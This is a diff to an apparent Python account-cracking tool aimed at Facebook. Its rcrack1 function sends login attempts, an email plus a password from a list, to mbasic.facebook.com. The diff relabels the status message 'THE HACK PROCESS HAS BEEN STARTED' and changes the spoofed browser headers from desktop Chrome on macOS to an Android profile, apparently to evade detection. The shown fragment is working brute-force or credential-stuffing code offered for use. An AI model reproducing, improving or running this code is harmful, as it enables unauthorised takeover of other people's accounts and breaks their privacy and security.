@@ -297,7 +297,7 @@ def v3():
         tl = str(len(user))
         print(' \033[1;94m[⚙️]  TOTAL IDS :\033[1;92m '+tl)
         print(f"\033[1;94m [⚙️]  YOUR TERGET HACK MENU:\033[1;92m {doamin}")
-        print(' \033[1;94m[⚙️]  THE CLONE PROCESS HAS BEEN STARTED')
+        print(' \033[1;94m[⚙️]  THE HACK PROCESS HAS BEEN STARTED')
         print(' \033[1;94m[⚙️]  WAIT FOR IDS ')
         print(50*'_')
         for guru in user:
@@ -330,16 +330,15 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
+            header_freefb = {"authority": 'mbasic.facebook.com',
             "method": 'GET',
             "scheme": 'https',
-            'path': '/login/device-based/login/async/?refsrc=deprecated&lwv=100',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-US,en;q=0.9',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
-            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="108", "Google Chrome";v="108"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"macOS"',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
